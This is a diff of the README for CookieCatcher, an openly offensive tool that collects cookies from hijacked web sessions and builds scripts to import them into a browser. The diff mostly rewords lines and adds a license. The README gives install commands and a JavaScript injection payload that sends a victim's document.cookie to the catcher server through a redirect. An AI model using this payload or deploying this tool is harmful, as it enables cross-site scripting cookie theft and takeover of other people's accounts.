@@ -4,16 +4,16 @@ This is a mini and simple API REST for management of Web sessions that were hija
 ### Features (that is simple)
 - Capture request through GET or POST (method)
 - Parse to cookies format
-- Create script for import in browser
+- Create script to import into your browser
 
 ### How to install this little devil?
-Server
 ```sh
 $ git https://github.com/JavaGarcia/CookieCatcher.git
 $ cd CookieCatcher
 $ npm install
 $ sudo DEBUG=APIcookies:* ./bin/www
 ```
+
 ### Scheme to send requests
 Example with ajax (POST or GET)
 ```javascript
@@ -28,4 +28,9 @@ Normal request GET (redirect)
 ```javascript
 document.location.href="http://cookieCatcher/session/"+document.domain+"/"+document.cookie;
 ```
+
+#### Made with love in Colombia.
+# License:
+
+CookieCatcher is licensed under the GPLv3: http://www.gnu.org/licenses/gpl-3.0.html. 
 
